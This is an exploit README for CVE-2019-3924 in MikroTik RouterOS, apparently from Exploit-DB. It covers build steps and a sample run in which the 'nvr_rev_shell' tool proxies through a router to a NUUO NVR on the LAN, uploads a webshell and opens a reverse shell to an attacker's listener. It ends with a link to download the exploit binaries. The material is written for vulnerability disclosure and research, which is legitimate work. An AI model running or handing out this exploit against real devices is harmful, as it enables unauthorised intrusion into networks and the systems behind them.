# CVE-2019-3924

A remote, unauthenticated attacker can proxy traffic through RouterOS via probes sent to the agent binary. This PoC demonstrates how to exploit a LAN host from the WAN. A video demonstrating the attack can be found here:

* https://www.youtube.com/watch?v=CxyOtsNVgFg

A Tenable Research Advisory for the vulnerability can be found here:

* https://www.tenable.com/security/research/tra-2019-07

## Compilation
This code was tested on Ubuntu 18.04. There is a dependency on boost, gtest, and cmake. Simply install them like so:

```sh
sudo apt install libboost-dev cmake
```

To compile simply do the following:

```sh
cd routeros/poc/cve_2019_3924/
mkdir build
cd build
cmake ..
```

## Sample Usage

```sh
albinolobster@ubuntu:~/routeros/poc/cve_2019_3924/build$ ./nvr_rev_shell --proxy_ip 192.168.1.70 --proxy_port 8291 --target_ip 10.0.0.252 --target_port 80 --listening_ip 192.168.1.7 --listening_port 1270
[!] Running in exploitation mode
[+] Attempting to connect to a MikroTik router at 192.168.1.70:8291
[+] Connected!
[+] Looking for a NUUO NVR at 10.0.0.252:80
[+] Found a NUUO NVR!
[+] Uploading a webshell
[+] Executing a reverse shell to 192.168.1.7:1270
[+] Done!
albinolobster@ubuntu:~/routeros/poc/cve_2019_3924/build$
```


Proof of Concept:
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46444.zip